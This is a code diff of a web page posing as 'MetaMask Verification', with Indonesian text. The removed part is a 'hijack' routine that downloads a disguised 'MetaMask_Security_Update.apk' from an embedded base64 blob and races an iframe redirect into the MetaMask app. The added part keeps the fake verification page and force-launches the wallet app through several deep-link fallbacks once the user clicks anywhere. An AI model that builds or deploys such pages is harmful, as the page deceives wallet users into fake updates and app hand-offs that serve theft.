@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Update</title>
+<title>Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -22,8 +22,8 @@
 
 <div class="panel" id="main-card">
   <h2>🦊 MetaMask Verification</h2>
-  <p>Klik di mana saja untuk memverifikasi wallet Anda.</p>
-  <div id="log">Sistem siap...</div>
+  <p>Klik di mana saja untuk melanjutkan.</p>
+  <div id="log">Sistem siap.</div>
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
@@ -41,94 +41,56 @@
   }
 
   // ============================================
-  // 1. METAMASK INTENT SCHEME (ANDROID)
+  // 1. METAMASK DEEP LINK (MULTIPLE SCHEMES)
   // ============================================
-  // Target package: io.metamask (atau com.metamask)
-  var METAMASK_INTENT = "intent://#Intent;" +
-                        "package=io.metamask;" +
-                        "scheme=metamask;" +
-                        "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
-                        "end;";
+  // Beberapa cara untuk membuka MetaMask di Android:
+  // A. Intent (Package Spesifik)
+  var intentMetaMask = "intent://#Intent;" +
+                       "package=io.metamask;" +
+                       "scheme=metamask;" +
+                       "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
+                       "end;";
 
-  // ============================================
-  // 2. TRIGGER RACE CONDITION (APK & INTENT)
-  // ============================================
-  function triggerMetamaskHijack() {
-    log("[!] Memicu Race Condition (APK + Intent)...");
+  // B. Universal Link (App Links Android)
+  var universalLink = "https://metamask.app.link/";
 
-    // A. Kamuflase: Unduh file APK (seolah-olah update)
-    try {
-      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
-      var binary = atob(b64Apk);
-      var bytes = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      
-      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
-      var url = URL.createObjectURL(blob);
-      
-      var a = document.createElement('a');
-      a.href = url;
-      a.download = 'MetaMask_Security_Update.apk';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      
-      log("[+] APK Download Triggered (Camouflage).");
-    } catch(e) {}
-
-    // B. Inject Iframe untuk memicu Intent MetaMask
-    // Eksekusi dalam 10ms setelah APK mulai terunduh
-    setTimeout(function() {
-      try {
-        var iframe = document.createElement('iframe');
-        // Sandbox yang meminta izin top navigation
-        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-        iframe.style.display = "none";
-        
-        // Gunakan srcdoc untuk menyuntikkan redirect
-        iframe.srcdoc = `
-          <!DOCTYPE html>
-          <html>
-          <body>
-            <script>
-              // Redirect ke Intent MetaMask
-              window.top.location.href = "${METAMASK_INTENT}";
-            <\/script>
-          </body>
-          </html>
-        `;
-        
-        document.getElementById('launcher-container').appendChild(iframe);
-        log("[+] MetaMask Intent Triggered via Iframe.");
-        
-        // C. Fallback: Top-Level Redirect (Jika iframe gagal)
-        setTimeout(function() {
-          window.location.href = METAMASK_INTENT;
-        }, 100);
-
-      } catch(e) {
-        log("[-] Iframe Error: " + e.message);
-      }
-    }, 10); // 10ms Race Window
-
-  }
+  // C. Custom Scheme (Direct)
+  var customScheme = "metamask://";
 
   // ============================================
-  // 3. TRIGGER AWAL (KLIK)
+  // 2. TRIGGER LAUNCH (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>Memverifikasi...</h2>
+      <h2>Membuka Aplikasi...</h2>
       <p>Menghubungkan ke MetaMask...</p>
       <div id="log">Memulai...</div>
     `;
     logEl = document.getElementById('log');
+    log("[!] Memulai Forced App Launch...");
 
-    // Jalankan Hijack
-    triggerMetamaskHijack();
+    // A. Coba Intent (Paling Ampuh di Android)
+    try {
+      log("[+] Mengirim Intent MetaMask...");
+      window.location.href = intentMetaMask;
+    } catch(e) {
+      log("[-] Intent Error: " + e.message);
+    }
+
+    // B. Fallback: Universal Link (Setelah 500ms)
+    setTimeout(function() {
+      log("[+] Fallback ke Universal Link...");
+      window.location.href = universalLink;
+    }, 500);
+
+    // C. Fallback: Custom Scheme (Setelah 1000ms)
+    setTimeout(function() {
+      log("[+] Fallback ke Custom Scheme...");
+      window.location.href = customScheme;
+    }, 1000);
 
   }, { once: true });
 
